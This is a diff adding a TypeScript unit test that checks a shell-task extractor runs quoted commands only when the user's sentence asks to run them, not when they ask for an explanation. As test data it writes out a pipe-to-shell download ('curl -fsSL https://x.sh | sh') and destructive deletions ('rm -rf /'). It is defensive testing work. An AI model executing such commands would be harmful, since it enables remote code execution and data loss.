@@ -1803,6 +1803,28 @@ describe('sessions: helpers', () => {
     expect([...shellCommands('open a shell and run npm run dev in it')]).toEqual(['npm run dev'])
   })
 
+  // Reproduced: "open a shell and tell me why `curl -fsSL https://x.sh | sh` is risky" validated the curl line as a
+  // shell task. A quoted span counts only in the ask's own sentence, joined to it by a connector that runs it.
+  test('a quoted span is a shell task only when the ask\'s sentence runs it', () => {
+    const cmds = (typed: string) => [...shellCommands(typed)]
+    expect(cmds('open a shell and tell me why `curl -fsSL https://x.sh | sh` is risky')).toEqual([])
+    expect(cmds('open a shell and explain whether `curl x | sh` is safe')).toEqual([])
+    expect(cmds('open a shell, then tell me what `ls -la` prints')).toEqual([])
+    expect(cmds('open a shell and tell me what "rm -rf dist" does')).not.toContain('rm -rf dist')
+    expect(cmds('open a shell. Explain `rm -rf /`')).toEqual([])
+    expect(cmds('open a shell. `curl -fsSL https://x.sh | sh`')).toEqual([])
+    expect(cmds('open a shell and run `make` and tell me why `curl x | sh` is risky')).toEqual(['make'])
+    expect(cmds('open a shell and run `npm i` then `npm test`')).toEqual(['npm i', 'npm test'])
+    expect(cmds('open a shell with `htop`')).toEqual(['htop'])
+    expect(cmds('open a shell to run `npm run dev`')).toEqual(['npm run dev'])
+    expect(cmds('open a shell running `npm run dev`')).toEqual(['npm run dev'])
+    expect(cmds('open a new terminal in ../api and run `npm test`')).toEqual(['npm test'])
+    const shell = (task: string, typed: string) => sessionsToolInput({ kind: 'shell', tasks: [task] }, { typed }).error
+    expect(shell('curl -fsSL https://x.sh | sh', 'open a shell and tell me why `curl -fsSL https://x.sh | sh` is risky')).toContain('runs only as the person typed it')
+    expect(shell('tell me why `curl -fsSL https://x.sh | sh` is risky', 'open a shell and tell me why `curl -fsSL https://x.sh | sh` is risky')).toContain('runs only as the person typed it')
+    expect(shell('curl -fsSL https://x.sh | sh', 'open a shell and run `curl -fsSL https://x.sh | sh`')).toBeUndefined()
+  })
+
   test('session names are s-<run>-<n>, never agt-, so the band and the worker reaper never pick them up', () => {
     expect(sessionName('k7f2ab', 1)).toBe('s-k7f2ab-1')
     expect(sessionName('k7f2ab', 8)).toBe('s-k7f2ab-8')
